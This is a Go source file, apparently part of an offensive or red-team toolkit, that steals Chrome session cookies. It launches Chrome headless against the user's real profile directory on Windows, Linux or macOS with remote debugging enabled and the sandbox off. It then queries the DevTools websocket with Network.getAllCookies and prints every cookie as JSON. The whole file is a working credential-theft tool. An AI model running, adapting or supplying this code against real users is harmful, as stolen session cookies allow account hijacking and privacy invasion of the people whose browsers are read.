package dump

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"time"

	"github.com/gorilla/websocket"
)

const (
	darwinUserDataDir  = "Library/Application Support/Google/Chrome"
	linuxUserDataDir   = ".config/google-chrome"
	windowsUserDataDir = `Google\Chrome\User Data`

	linuxChromeBin   = "google-chrome"
	darwinChromeBin  = `/Applications/Google Chrome.app/Contents/MacOS/Google Chrome`
	windowsChromeBin = `C:\Program Files (x86)\Google\Chrome\Application\Chrome.exe`
)

func getOsSpecificPaths() (string, string) {
	var (
		userDataDir string
		home        string
		chromePath  string
	)

	switch runtime.GOOS {
	case "windows":
		home, _ = os.LookupEnv("LOCALAPPDATA")
		userDataDir = fmt.Sprintf("%s\\%s", home, windowsUserDataDir)
		chromePath = windowsChromeBin
	case "linux":
		home, _ = os.LookupEnv("HOME")
		userDataDir = fmt.Sprintf("%s/%s", home, linuxUserDataDir)
		chromePath = linuxChromeBin
		break
	case "darwin":
		home, _ = os.LookupEnv("HOME")
		userDataDir = fmt.Sprintf("%s/%s", home, darwinUserDataDir)
		chromePath = darwinChromeBin
		break
	}
	return userDataDir, chromePath
}

func Dump() {
	userDataDir, chromePath := getOsSpecificPaths()
	cmd := exec.Command(chromePath, "--headless", "--user-data-dir="+userDataDir, "--remote-debugging-port=9222", "--no-sandbox")

	err := cmd.Start()
	if err != nil {
		fmt.Printf("[!] could not start chrome: %v", err)
		return
	}
	time.Sleep(2 * time.Second)
	resp, err := http.Get("http://localhost:9222/json")
	if err != nil {
		fmt.Printf("[!] error contacting chrome debugger: %v", err)
		return
	}
	bodyBytes, err := ioutil.ReadAll(resp.Body)
	var result []map[string]interface{}
	err = json.Unmarshal(bodyBytes, &result)
	if err != nil {
		fmt.Printf("[!] error unmarshalling json: %v", err)
		return
	}
	websocketURL := fmt.Sprintf("%v", result[0]["webSocketDebuggerUrl"])
	conn, _, err := websocket.DefaultDialer.Dial(websocketURL, http.Header{})
	err = conn.WriteMessage(websocket.TextMessage, []byte("{\"id\": 1, \"method\": \"Network.getAllCookies\"}"))
	if err != nil {
		fmt.Printf("[!] could not write to websocket: %v", err)
		return
	}
	var data string
	go func() {
		for {
			msgType, buf, err := conn.ReadMessage()
			if err != nil {
				fmt.Printf("[!] could not read message: %v", err)
				break
			}
			if len(buf) == 0 {
				break
			}
			if msgType == websocket.TextMessage {
				data += string(buf)
			}
		}
	}()
	time.Sleep(1 * time.Second)
	cmd.Process.Kill()
	var buf bytes.Buffer
	err = json.Indent(&buf, []byte(data), "", " ")
	if err != nil {
		return
	}
	fmt.Println(buf.String())
}
